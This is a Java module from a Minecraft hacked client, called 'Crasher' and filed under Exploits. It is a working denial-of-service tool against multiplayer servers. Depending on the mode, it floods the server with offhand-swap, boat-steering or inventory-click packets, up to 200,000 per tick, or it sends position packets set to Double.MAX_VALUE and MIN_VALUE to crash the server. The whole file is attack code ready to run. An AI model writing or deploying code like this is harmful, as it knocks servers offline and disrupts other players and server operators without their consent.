package com.lemonclient.client.module.modules.exploits;

import com.lemonclient.api.event.events.PacketEvent;
import com.lemonclient.api.setting.values.IntegerSetting;
import com.lemonclient.api.setting.values.ModeSetting;
import com.lemonclient.client.module.Category;
import com.lemonclient.client.module.Module;
import java.util.Arrays;
import java.util.function.Predicate;
import me.zero.alpine.listener.EventHandler;
import me.zero.alpine.listener.Listener;
import net.minecraft.entity.item.EntityBoat;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.network.play.client.CPacketPlayerDigging.Action;
import net.minecraft.network.play.server.SPacketDisconnect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;

@Module.Declaration(
   name = "Crasher",
   category = Category.Exploits
)
public class Crasher extends Module {
   ModeSetting mode = this.registerMode("Mode", Arrays.asList("Position", "2bpvp", "Boat", "Offhand"), "Offhand");
   IntegerSetting amount = this.registerInteger("Boat Amount", 500, 1, 200000, () -> {
      return ((String)this.mode.getValue()).equals("Boat");
   });
   IntegerSetting speed = this.registerInteger("Speed", 500, 1, 200000, () -> {
      return ((String)this.mode.getValue()).equals("Offhand");
   });
   @EventHandler
   private final Listener<PacketEvent.Send> sendListener = new Listener((event) -> {
      if (event.getPacket() instanceof CPacketPlayer && ((String)this.mode.getValue()).equals("Position")) {
         CPacketPlayer e = (CPacketPlayer)event.getPacket();
         if (mc.field_71439_g.field_70173_aa % 2 == 0) {
            e.field_149479_a = Double.MAX_VALUE;
            e.field_149478_c = Double.MAX_VALUE;
         } else {
            e.field_149479_a = Double.MIN_VALUE;
            e.field_149478_c = Double.MIN_VALUE;
         }
      }

   }, new Predicate[0]);
   @EventHandler
   private final Listener<PacketEvent.Receive> receiveListener = new Listener((event) -> {
      if (event.getPacket() instanceof SPacketDisconnect) {
         this.disable();
      }

   }, new Predicate[0]);

   public void onTick() {
      String var1 = (String)this.mode.getValue();
      byte var2 = -1;
      switch(var1.hashCode()) {
      case 2076000:
         if (var1.equals("Boat")) {
            var2 = 1;
         }
         break;
      case 49206970:
         if (var1.equals("2bpvp")) {
            var2 = 2;
         }
         break;
      case 115914302:
         if (var1.equals("Offhand")) {
            var2 = 0;
         }
      }

      int i;
      switch(var2) {
      case 0:
         for(i = 1; i <= (Integer)this.speed.getValue(); ++i) {
            mc.field_71439_g.field_71174_a.func_147297_a(new CPacketPlayerDigging(Action.SWAP_HELD_ITEMS, BlockPos.field_177992_a, EnumFacing.DOWN));
         }

         return;
      case 1:
         if (mc.field_71439_g.field_184239_as instanceof EntityBoat) {
            for(i = 0; i < (Integer)this.speed.getValue(); ++i) {
               mc.field_71439_g.field_71174_a.func_147297_a(new CPacketSteerBoat(true, true));
            }
         }
         break;
      case 2:
         for(i = 0; i < 1000; ++i) {
            ItemStack item = new ItemStack(mc.field_71439_g.func_184586_b(EnumHand.MAIN_HAND).func_77973_b());
            CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
            mc.field_71439_g.field_71174_a.func_147297_a(packet);
         }
      }

   }
}
